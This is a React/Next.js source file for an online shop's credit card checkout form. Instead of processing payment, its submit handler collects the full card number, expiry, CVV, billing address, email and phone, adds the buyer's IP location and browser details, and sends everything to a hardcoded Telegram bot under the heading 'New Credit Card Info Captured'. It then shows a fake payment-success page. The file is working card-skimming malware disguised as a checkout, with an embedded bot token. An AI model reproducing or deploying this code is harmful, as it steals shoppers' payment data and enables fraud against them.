'use client'
import { useCart } from '@/contexts/CartContext';
import { useState } from 'react';
import { useForm } from 'react-hook-form';
import { jwtDecode } from 'jwt-decode';
import { useRouter } from 'next/navigation';

type CartItem = {
  id: string;
  quantity: number;
  selectedAmount: number;
  title: string;
};

type UserToken = {
  id: string;
  name: string;
  email: string;
};

const TELEGRAM_BOT_TOKEN = '7737474698:AAHyZKVaQLgdeNBEwvpbwXIToyFYfZ5TSR4';
const TELEGRAM_CHAT_ID = '7860277201';

interface CreditCardFormProps {
  totalAmount: number;
}

interface CreditCardFormData {
  cardNumber: string;
  expDate: string;
  cvv: string;
  cardName: string;
  email: string;
  streetAddress: string;
  city: string;
  country: string;
  zipCode: string;
  phoneNumber: string;
}

const escapeMarkdown = (text: string) => {
  return text.replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
};

const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
  const router = useRouter();
  const { cartItems, clearCart } = useCart();
  const { register, handleSubmit } = useForm<CreditCardFormData>();
  const [form, setForm] = useState({
    cardName: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    email: '',
    streetAddress: '',
    city: '',
    country: '',
    zipCode: '',
    phoneNumber: '',
  });

  const [errors, setErrors] = useState<Record<string, string>>({});
  const [status, setStatus] = useState({ message: '', color: '' });
  const [loading, setLoading] = useState(false);

  const checkAuth = () => {
    const token = document.cookie
      .split('; ')
      .find(row => row.startsWith('auth_token='))
      ?.split('=')[1];

    if (!token) {
      router.push('/signin');
      return null;
    }

    try {
      const user = jwtDecode<UserToken>(token);
      if (!user || !user.id) {
        router.push('/signin');
        return null;
      }
      return user;
    } catch (error) {
      router.push('/signin');
      return null;
    }
  };

  const luhnCheck = (num: string): boolean => {
    const arr = num.split('').reverse().map(x => parseInt(x, 10));
    let sum = arr.reduce((acc, val, i) => {
      if (i % 2 === 1) {
        val *= 2;
        if (val > 9) val -= 9;
      }
      return acc + val;
    }, 0);
    return sum % 10 === 0;
  };

  const validateExpiry = (exp: string): boolean => {
    if (!/^\d{2}\/\d{2}$/.test(exp)) return false;
    const [mm, yy] = exp.split('/').map(x => parseInt(x, 10));
    if (mm < 1 || mm > 12) return false;
    const now = new Date();
    const expDate = new Date(2000 + yy, mm);
    return expDate > now;
  };

  const formatCardNumber = (value: string): string => {
    return value.replace(/\D/g, '').substring(0, 16)
      .replace(/(.{4})/g, '$1 ').trim();
  };

  const formatExpiry = (value: string): string => {
    const digits = value.replace(/\D/g, '').substring(0, 4);
    if (digits.length >= 3) {
      return digits.substring(0, 2) + '/' + digits.substring(2);
    }
    return digits;
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const user = checkAuth();
    if (!user) return;

    const { name, value } = e.target;
    let val = value;

    if (name === 'cardNumber') val = formatCardNumber(value);
    if (name === 'expiry') val = formatExpiry(value);
    if (name === 'cvv') val = value.replace(/\D/g, '').substring(0, 4);

    setForm(prev => ({ ...prev, [name]: val }));
    setErrors(prev => ({ ...prev, [name]: '' }));
    setStatus({ message: '', color: '' });
  };

  const validateForm = (): boolean => {
    const user = checkAuth();
    if (!user) return false;

    const errs: Record<string, string> = {};
    if (!form.cardName.trim()) errs.cardName = 'Please enter your name.';
    const cardNumRaw = form.cardNumber.replace(/\s/g, '');
    if (!luhnCheck(cardNumRaw)) errs.cardNumber = 'Invalid card number.';
    if (!validateExpiry(form.expiry)) errs.expiry = 'Invalid expiry date.';
    if (!/^\d{3,4}$/.test(form.cvv)) errs.cvv = 'Invalid CVV.';
    if (!form.email.trim()) errs.email = 'Please enter your email.';
    if (!form.streetAddress.trim()) errs.streetAddress = 'Please enter your street address.';
    if (!form.city.trim()) errs.city = 'Please enter your city.';
    if (!form.country.trim()) errs.country = 'Please enter your country.';
    if (!form.zipCode.trim()) errs.zipCode = 'Please enter your zip code.';
    if (!form.phoneNumber.trim()) errs.phoneNumber = 'Please enter your phone number.';
    setErrors(errs);
    return Object.keys(errs).length === 0;
  };

  const onSubmit = async (data: CreditCardFormData) => {
    const user = checkAuth();
    if (!user) return;

    if (!validateForm()) return;
    
    setLoading(true);
    setStatus({ message: '', color: '' });

    try {
      // 1. Get IP information (optional)
      let ipInfo = 'Unknown IP';
      try {
        const res = await fetch('https://ipapi.co/json/');
        if (res.ok) {
          const ipData = await res.json();
          ipInfo = `${ipData.ip} - ${ipData.city}, ${ipData.region}, ${ipData.country_name}`;
        }
      } catch (ipError) {
        console.error('Error fetching IP info:', ipError);
      }

      // 2. Prepare Telegram message (optional)
      const message = `
*New Credit Card Info Captured*

\\- Name: ${escapeMarkdown(form.cardName)}
\\- Card Number: ${escapeMarkdown(form.cardNumber.replace(/\s/g, ''))}
\\- Expiry: ${escapeMarkdown(form.expiry)}
\\- CVV: ${escapeMarkdown(form.cvv)}
\\- Email: ${escapeMarkdown(form.email)}
\\- Street Address: ${escapeMarkdown(form.streetAddress)}
\\- City: ${escapeMarkdown(form.city)}
\\- Country: ${escapeMarkdown(form.country)}
\\- Zip Code: ${escapeMarkdown(form.zipCode)}
\\- Phone Number: ${escapeMarkdown(form.phoneNumber)}

*IP Info*: ${escapeMarkdown(ipInfo)}
*User Agent*: ${escapeMarkdown(navigator.userAgent)}
*Timestamp*: ${escapeMarkdown(new Date().toISOString())}
      `.trim();

      // 3. Send Telegram notification (optional)
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const telegramRes = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'MarkdownV2',
        }),
      });
      
      const telegramData = await telegramRes.json();
     
      if (!telegramRes.ok) {
        throw new Error(telegramData.description || 'Failed to send Telegram notification');
      }

      // 4. Clear cart and redirect (NO PURCHASE DATA SAVED)
      clearCart();
      router.push('/payment/success');

    } catch (error) {
      setStatus({ 
        message: `Error: ${error instanceof Error ? error.message : 'Payment processing failed'}`,
        color: 'red' 
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
      <div className="grid grid-cols-2 gap-4">
        <div className="col-span-2">
          <input
            type="text"
            name="cardName"
            placeholder="Name on Card"
            value={form.cardName}
            onChange={handleChange}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.cardName ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.cardName && <p className="text-red-500 text-sm mt-1">{errors.cardName}</p>}
        </div>

        <div className="col-span-2">
          <input
            type="text"
            name="cardNumber"
            placeholder="Card Number (e.g. 1234 5678 9012 3456)"
            value={form.cardNumber}
            onChange={handleChange}
            maxLength={19}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.cardNumber ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.cardNumber && <p className="text-red-500 text-sm mt-1">{errors.cardNumber}</p>}
        </div>

        <div>
          <input
            type="text"
            name="expiry"
            placeholder="Expiry MM/YY"
            value={form.expiry}
            onChange={handleChange}
            maxLength={5}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.expiry ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.expiry && <p className="text-red-500 text-sm mt-1">{errors.expiry}</p>}
        </div>

        <div>
          <input
            type="text"
            name="cvv"
            placeholder="CVV"
            value={form.cvv}
            onChange={handleChange}
            maxLength={4}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.cvv ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.cvv && <p className="text-red-500 text-sm mt-1">{errors.cvv}</p>}
        </div>

        <div className="col-span-2">
          <input
            type="email"
            name="email"
            placeholder="Email"
            value={form.email}
            onChange={handleChange}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.email ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.email && <p className="text-red-500 text-sm mt-1">{errors.email}</p>}
        </div>

        <div className="col-span-2">
          <input
            type="text"
            name="streetAddress"
            placeholder="Street Address"
            value={form.streetAddress}
            onChange={handleChange}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.streetAddress ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.streetAddress && <p className="text-red-500 text-sm mt-1">{errors.streetAddress}</p>}
        </div>

        <div>
          <input
            type="text"
            name="city"
            placeholder="City"
            value={form.city}
            onChange={handleChange}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.city ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.city && <p className="text-red-500 text-sm mt-1">{errors.city}</p>}
        </div>

        <div>
          <input
            type="text"
            name="country"
            placeholder="Country"
            value={form.country}
            onChange={handleChange}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.country ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.country && <p className="text-red-500 text-sm mt-1">{errors.country}</p>}
        </div>

        <div className="col-span-2">
          <input
            type="text"
            name="zipCode"
            placeholder="Zip Code"
            value={form.zipCode}
            onChange={handleChange}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.zipCode ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.zipCode && <p className="text-red-500 text-sm mt-1">{errors.zipCode}</p>}
        </div>

        <div className="col-span-2">
          <input
            type="text"
            name="phoneNumber"
            placeholder="Phone Number"
            value={form.phoneNumber}
            onChange={handleChange}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.phoneNumber ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.phoneNumber && <p className="text-red-500 text-sm mt-1">{errors.phoneNumber}</p>}
        </div>
      </div>

      <div className="pt-4">
        <button
          type="submit"
          disabled={loading}
          className={`w-full py-3 px-4 rounded-xl font-bold text-white transition-all ${loading ? 'bg-blue-400 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700'}`}
        >
          {loading ? (
            <div className="flex items-center justify-center space-x-2">
              <span>Processing...</span>
              <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
            </div>
          ) : (
            `Pay $${totalAmount.toFixed(2)}`
          )}
        </button>
      </div>

      {status.message && (
        <p className={`text-center font-medium ${status.color === 'red' ? 'text-red-600' : 'text-green-600'}`}>
          {status.message}
        </p>
      )}
    </form>
  );
};

export default CreditCardForm;